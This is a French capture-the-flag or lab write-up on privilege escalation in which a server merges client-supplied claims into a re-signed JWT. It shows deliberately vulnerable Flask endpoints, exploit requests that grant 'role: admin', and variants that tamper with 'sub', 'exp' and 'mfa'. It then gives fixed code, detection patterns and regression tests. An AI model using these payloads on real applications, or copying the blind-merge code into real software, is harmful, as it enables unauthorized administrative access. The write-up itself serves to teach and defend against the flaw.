# Write-up : Élévation de privilèges par re-signature aveugle de claims JWT

---

## HELLO FRIENDS

La vulnérabilité d'élévation de privilèges par re-signature aveugle de claims survient lorsqu'un serveur accepte des données d'autorisation (`role`, `isAdmin`, `permissions`) fournies par le client, puis les intègre dans un nouveau JWT signé avec la clé légitime du serveur. L'attaquant n'a pas besoin de connaître le secret : le serveur contresigne lui-même des privilèges qu'il n'aurait jamais dû accorder.

- **Sévérité** : Critique (CVSS 9.1)
- **CWE** : CWE-269 (Improper Privilege Management) / CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Catégorie OWASP** : A01:2021 — Broken Access Control
- **Impact** : Escalade de privilèges, accès administrateur, contournement complet du contrôle d'accès
- **Exploitabilité** : Triviale, aucun outil spécialisé requis

---

## 1. Rappel sur les claims JWT

Un JWT transporte un ensemble de claims (revendications) qui décrivent l'identité et les droits de l'utilisateur. Trois catégories existent :

| Type | Exemple | Rôle |
|------|---------|------|
| Claims enregistrés | `sub`, `exp`, `iat`, `iss` | Standardisés par la RFC 7519 |
| Claims publics | `email`, `username` | Enregistrés auprès de l'IANA |
| Claims privés | `role`, `isAdmin`, `permissions` | Définis par l'application |

Les claims privés sont ceux qui portent les décisions d'autorisation. Leur intégrité est donc critique : si un utilisateur peut les modifier, il peut s'attribuer des droits.

---

## 2. Principe de la vulnérabilité

### 2.1 Séparation entre identité et autorisation

Un JWT est une preuve d'identité, pas une preuve d'autorisation. Cette distinction est fondamentale :

- **Identité** : qui est l'utilisateur (`sub`, `username`)
- **Autorisation** : ce que l'utilisateur peut faire (`role`, `permissions`)

L'identité peut être portée par un JWT signé. L'autorisation doit toujours être vérifiée côté serveur contre une source de confiance (base de données, annuaire, service de politiques).

### 2.2 Mécanisme de la faille

La vulnérabilité se manifeste lorsque le serveur expose une fonctionnalité qui :

1. Décode le JWT pour récupérer le payload
2. Fusionne ce payload avec les données envoyées par le client
3. Re-signe l'ensemble avec la clé légitime
4. Retourne le nouveau token au client

Le point critique est l'étape 2 : la fusion est aveugle. L'attaquant envoie `{"role": "admin"}` et le serveur produit un token signé contenant ce rôle, sans vérifier que l'utilisateur a le droit de modifier ce champ.

### 2.3 Variantes d'implémentation vulnérable

```python
new_payload = {**payload, **updates}       # fusion Python
new_payload = payload | updates             # opérateur union
Object.assign(payload, updates)             # JavaScript
array_merge($payload, $request->all())      # PHP
```

Toutes ces constructions partagent le même défaut : elles accordent au client la capacité d'écraser n'importe quelle clé.

---

## 3. Contexte historique et occurrences connues

Ce type de faille apparaît régulièrement dans les applications qui implémentent une "mise à jour de profil" ou une "activation d'abonnement" en modifiant directement le token côté serveur.

Exemples courants :

| Application | Faille | Impact |
|-------------|--------|--------|
| Plateforme SaaS freemium | `isPremium` modifiable via PUT /profile | Accès gratuit aux fonctionnalités payantes |
| Espace client bancaire | `role` modifiable via préférences | Accès aux comptes d'autres clients |
| API partenaires | `permissions` modifiable via webhook | Accès à des endpoints restreints |

La faille n'a pas de CVE spécifique car elle dépend de l'implémentation, mais elle est référencée dans le Top 10 OWASP API Security sous API5:2023 — Broken Function Level Authorization.

---

## 4. Environnement du laboratoire

### 4.1 Application cible

Application de gestion d'entreprise ACME Corp avec trois niveaux d'accès :

- Utilisateur standard (`role: user`) : accès en lecture
- Modérateur (`role: mod`) : accès lecture et écriture
- Administrateur (`role: admin`) : accès complet

### 4.2 Comptes de test

```
Utilisateur : alice / alice123  (role: user)
Administrateur : admin / admin123 (role: admin)
```

### 4.3 Endpoints

```
GET  /                    - Page de connexion
GET  /dashboard           - Tableau de bord
POST /api/login           - Authentification
GET  /api/me              - Profil courant (décodage sans vérification)
PUT  /api/profile         - Mise à jour de profil (vulnérable)
PUT  /api/profile/secure  - Mise à jour de profil (sécurisée)
GET  /api/admin/data      - Endpoint administrateur (vulnérable)
GET  /api/admin/secure    - Endpoint administrateur (sécurisé)
```

---

## 5. Analyse du code vulnérable

### 5.1 Endpoint de mise à jour de profil

```python
@app.route("/api/profile", methods=["PUT"])
def update_profile_vuln():
    token = get_token_from_request()
    payload = jwt_decode(token, SECRET_KEY)

    updates = request.get_json() or {}

    # Faille : fusion aveugle + re-signature
    new_payload = {**payload, **updates}
    new_payload["exp"] = int(time.time()) + 3600

    new_token = jwt_encode(new_payload, SECRET_KEY)
    resp = make_response(jsonify(ok=True, user=new_payload))
    resp.set_cookie("token", new_token, httponly=False)
    return resp
```

### 5.2 Endpoint administrateur

```python
@app.route("/api/admin/data")
def admin_data():
    token = get_token_from_request()
    payload = jwt_decode(token, SECRET_KEY)

    # Faille : confiance dans le claim role du token
    if payload.get("role") != "admin":
        return jsonify(ok=False, error="Accès refusé"), 403

    return jsonify(ok=True, data={"flag": "SPECTRA{...}", ...})
```

### 5.3 Analyse des anti-patterns

| Anti-pattern | Localisation | Conséquence |
|--------------|--------------|-------------|
| Fusion `{**payload, **updates}` | `/api/profile` | Écrasement arbitraire de n'importe quel claim |
| Aucune whitelist de champs | `/api/profile` | Le client choisit ce qu'il modifie |
| Re-signature serveur | `/api/profile` | Le token modifié devient légitime |
| Confiance dans `role` du token | `/api/admin/data` | L'autorisation dépend du client |
| Rôle non rechargé depuis la base | `/api/admin/data` | Aucune vérification d'intégrité |

---

## 6. Exploitation pas à pas

### 6.1 Reconnaissance

Connexion avec le compte alice :

```
POST /api/login
Content-Type: application/json

{"username":"alice","password":"alice123"}
```

Réponse :

```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsImVtYWlsIjoiYWxpY2VAYWNtZS5pbyIsInJvbGUiOiJ1c2VyIiwiaXNBZG1pbiI6ZmFsc2UsInBlcm1pc3Npb25zIjpbInJlYWQiXSwiaWF0IjoxNzE5OTk5OTk5LCJleHAiOjE3MjAwMDM1OTl9.xxxxx
```

Décodage du payload :

```json
{
  "sub": "1",
  "username": "alice",
  "email": "alice@acme.io",
  "role": "user",
  "isAdmin": false,
  "permissions": ["read"],
  "iat": 1719999999,
  "exp": 1720003599
}
```

### 6.2 Test initial

Tentative d'accès à l'endpoint administrateur :

```
GET /api/admin/data
Cookie: token=<token légitime>
```

Réponse :

```
HTTP/1.1 403 Forbidden
{"ok": false, "error": "Accès refusé"}
```

### 6.3 Identification de l'endpoint vulnérable

L'analyse du JavaScript du dashboard révèle un formulaire de mise à jour de profil qui appelle :

```
PUT /api/profile
Content-Type: application/json

{"email": "alice@acme.io"}
```

Test basique pour observer le comportement :

```javascript
fetch('/api/profile', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'nouveau@acme.io'})
}).then(r => r.json()).then(console.log);
```

Réponse :

```json
{
  "ok": true,
  "user": {
    "sub": "1",
    "username": "alice",
    "email": "nouveau@acme.io",
    "role": "user",
    "isAdmin": false,
    "permissions": ["read"],
    "exp": 1720003599
  }
}
```

Le serveur retourne un nouveau token avec l'email modifié et un cookie mis à jour. Le champ `role` n'a pas changé parce qu'il n'a pas été envoyé. Test décisif : envoyer également `role`.

### 6.4 Exploitation

Envoi du payload malveillant :

```javascript
fetch('/api/profile', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    email: 'alice@acme.io',
    role: 'admin',
    isAdmin: true,
    permissions: ['read', 'write', 'delete', 'admin']
  })
}).then(r => r.json()).then(console.log);
```

Réponse :

```json
{
  "ok": true,
  "user": {
    "sub": "1",
    "username": "alice",
    "email": "alice@acme.io",
    "role": "admin",
    "isAdmin": true,
    "permissions": ["read", "write", "delete", "admin"],
    "exp": 1720003599
  }
}
```

Le serveur a :

1. Décodé le token légitime (rôle `user`)
2. Fusionné les données du client (rôle `admin`)
3. Re-signé l'ensemble avec `SECRET_KEY`
4. Retourné le nouveau token via `Set-Cookie`

### 6.5 Accès administrateur

```
GET /api/admin/data
Cookie: token=<nouveau token>
```

Réponse :

```
HTTP/1.1 200 OK
{
  "ok": true,
  "data": {
    "flag": "SPECTRA{cl41ms_4r3_n0t_trust}",
    ...
  }
}
```

L'attaquant a obtenu un accès administrateur complet sans jamais connaître la clé secrète.

### 6.6 Vérification de la remédiation

Le même payload envoyé sur l'endpoint sécurisé :

```javascript
fetch('/api/profile/secure', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    email: 'alice@acme.io',
    role: 'admin',
    isAdmin: true
  })
}).then(r => r.json()).then(console.log);
```

Réponse :

```json
{
  "ok": true,
  "user": {
    "sub": "1",
    "username": "alice",
    "email": "alice@acme.io",
    "role": "user",
    "isAdmin": false,
    "permissions": ["read"],
    "exp": 1720003599
  }
}
```

Le champ `role` est ignoré. Le serveur a rechargé le rôle depuis la base de données.

Confirmation sur l'endpoint admin sécurisé :

```
GET /api/admin/secure
Cookie: token=<nouveau token>
```

Réponse :

```
HTTP/1.1 403 Forbidden
{"ok": false, "error": "Accès refusé"}
```

---

## 7. Variantes d'exploitation

### 7.1 Écrasement de `sub` (usurpation d'identité)

Envoyer `{"sub": "0"}` remplace l'identifiant utilisateur par celui de l'administrateur. Toutes les vérifications basées sur `sub` deviennent alors faussées.

### 7.2 Ajout de claims inexistants

Ajouter `{"premium": true}` ou `{"beta": true}` peut débloquer des fonctionnalités non prévues si le reste du code lit ces claims sans validation.

### 7.3 Injection de structures complexes

```json
{
  "permissions": ["read", "write", "delete", "admin"],
  "scope": "admin:*",
  "roles": ["admin", "superuser"]
}
```

Certaines applications utilisent des objets imbriqués ou des tableaux sans vérifier le type, ce qui peut contourner des logiques d'autorisation naïves.

### 7.4 Manipulation de l'expiration

Envoyer `{"exp": 9999999999}` repousse l'expiration à très long terme, transformant un token temporaire en token quasi permanent.

### 7.5 Modification du couple `iss` / `aud`

Si le serveur accepte plusieurs émetteurs ou audiences, un utilisateur peut s'attribuer un `iss` privilégié pour accéder à des endpoints destinés à un autre service.

### 7.6 Suppression de contraintes

Envoyer explicitement `{"isAdmin": false, "role": "user"}` ne casse rien mais peut être utilisé pour observer la logique serveur. En revanche, `{"mfa": false}` ou `{"verified": false}` peut désactiver des contrôles.

---

## 8. Conditions d'exploitation

| Condition | Description |
|-----------|-------------|
| Endpoint de mise à jour | Existence d'un endpoint qui re-signe le token |
| Fusion aveugle | Aucune whitelist de champs modifiables |
| Claims sensibles dans le payload | `role`, `isAdmin`, `permissions` présents |
| Endpoint protégé | L'attaquant peut atteindre une route réservée |
| Confiance dans le claim | Le serveur lit le rôle depuis le token, pas depuis la base |

L'exploitation nécessite uniquement un compte utilisateur valide.

---

## 9. Remédiation

### 9.1 Principe directeur

Deux règles à appliquer simultanément :

1. Le client ne choisit pas les champs qu'il peut modifier (whitelist stricte).
2. Le serveur ne fait jamais confiance aux claims d'autorisation du token. Il les recharge depuis une source de confiance.

### 9.2 Endpoint de mise à jour corrigé

```python
ALLOWED_FIELDS = {"email"}

@app.route("/api/profile/secure", methods=["PUT"])
def update_profile_secure():
    token = get_token_from_request()
    payload = jwt_decode(token, SECRET_KEY)

    updates = request.get_json() or {}

    # Filtrage : seuls les champs autorisés passent
    clean = {k: v for k, v in updates.items() if k in ALLOWED_FIELDS}

    # Rechargement depuis la base de données
    username = payload.get("username")
    if username not in USERS:
        return jsonify(ok=False, error="Utilisateur inconnu"), 401

    db_user = USERS[username]

    new_payload = {
        "sub":         db_user["sub"],
        "username":    username,
        "email":       clean.get("email", db_user["email"]),
        "role":        db_user["role"],
        "isAdmin":     db_user["role"] == "admin",
        "permissions": ["read"] if db_user["role"] == "user" else
                       ["read", "write", "delete", "admin"],
        "exp":         int(time.time()) + 3600,
    }

    new_token = jwt_encode(new_payload, SECRET_KEY)
    resp = make_response(jsonify(ok=True, user=new_payload))
    resp.set_cookie("token", new_token, httponly=False)
    return resp
```

Points clés :

- Aucune fusion aveugle : les champs sont reconstruits un par un
- Whitelist explicite des champs modifiables
- Le rôle est lu depuis `USERS`, jamais depuis le payload
- Les permissions sont recalculées à partir du rôle en base

### 9.3 Endpoint administrateur corrigé

```python
@app.route("/api/admin/secure")
def admin_secure():
    token = get_token_from_request()
    payload = jwt_decode(token, SECRET_KEY)

    username = payload.get("username")
    if username not in USERS:
        return jsonify(ok=False, error="Utilisateur inconnu"), 401

    # Le rôle vient de la base, pas du token
    if USERS[username]["role"] != "admin":
        return jsonify(ok=False, error="Accès refusé"), 403

    return jsonify(ok=True, data={"message": "Accès autorisé"})
```

Le serveur ignore complètement le claim `role` du token.

### 9.4 Mesures complémentaires

| Mesure | Description |
|--------|-------------|
| Whitelist systématique | Toute entrée client passe par un filtre de champs autorisés |
| Rechargement depuis la source | Les droits sont toujours lus depuis la base |
| Principe du moindre privilège | Le token ne contient que les données nécessaires |
| Ne pas mettre d'autorisation dans le token | Se contenter d'un identifiant utilisateur (`sub`) |
| Journalisation | Tracer les modifications de profil et détecter les tentatives suspectes |
| Validation par schéma | Utiliser Pydantic ou équivalent pour typer et filtrer les entrées |
| Tests automatisés | Vérifier qu'un payload `role=admin` est bien ignoré |

### 9.5 Détection par analyse statique

Patterns à rechercher :

```
{**payload, **updates}
Object.assign(payload, req.body)
array_merge($payload, $request->all())
_.merge(token, body)
```

Toute fusion d'un payload JWT avec des données client est un signal d'alarme.

---

## 10. Tests de non-régression

```python
def test_role_ignore_lors_de_update(client):
    # Connexion en tant que user
    client.post("/api/login", json={"username": "alice", "password": "alice123"})

    # Tentative d'escalade
    r = client.put("/api/profile/secure", json={"role": "admin"})
    assert r.status_code == 200
    assert r.get_json()["user"]["role"] == "user"

def test_acces_admin_refuse_apres_escalade(client):
    client.post("/api/login", json={"username": "alice", "password": "alice123"})
    client.put("/api/profile/secure", json={"role": "admin"})

    r = client.get("/api/admin/secure")
    assert r.status_code == 403

def test_champ_non_autorise_ignore(client):
    client.post("/api/login", json={"username": "alice", "password": "alice123"})

    r = client.put("/api/profile/secure", json={
        "email": "alice@acme.io",
        "isAdmin": True,
        "permissions": ["admin"]
    })
    assert r.get_json()["user"]["isAdmin"] is False
```

---

## 11. Impact métier

L'exploitation de cette vulnérabilité permet à un attaquant :

- D'accéder à des interfaces d'administration sans autorisation
- De consulter, modifier ou supprimer des données sensibles
- D'usurper l'identité d'autres utilisateurs via `sub`
- De contourner les facturations (SaaS, abonnements)
- D'étendre ses privilèges de manière persistante
- D'agir avec les droits d'un compte à privilèges élevés

Dans un contexte de production, l'impact inclut une compromission potentielle de données personnelles (RGPD), une atteinte à l'intégrité des données métier, et une perte de confiance des utilisateurs.

---

## 12. Conclusion

La faille de re-signature aveugle de claims repose sur une confusion entre deux concepts distincts : l'identité et l'autorisation. Un JWT peut attester l'identité d'un utilisateur, mais il ne doit jamais servir de source de vérité pour ses droits.

Deux corrections sont indispensables et complémentaires :

- Filtrer les entrées client avec une whitelist stricte
- Recharger systématiquement les autorisations depuis une source de confiance

La simple application de ces deux principes élimine la classe entière de ces vulnérabilités. Le contrôle d'accès appartient au serveur ; le client ne fait que proposer des changements que le serveur valide ou rejette.

---

## Références

- RFC 7519 — JSON Web Token (JWT)
- OWASP API Security Top 10 — API5:2023 Broken Function Level Authorization
- OWASP Top 10 — A01:2021 Broken Access Control
- OWASP JSON Web Token Cheat Sheet
- CWE-269 : Improper Privilege Management
- CWE-639 : Authorization Bypass Through User-Controlled Key
- PortSwigger Web Security Academy — JWT attacks
- NIST SP 800-63 — Digital Identity Guidelines
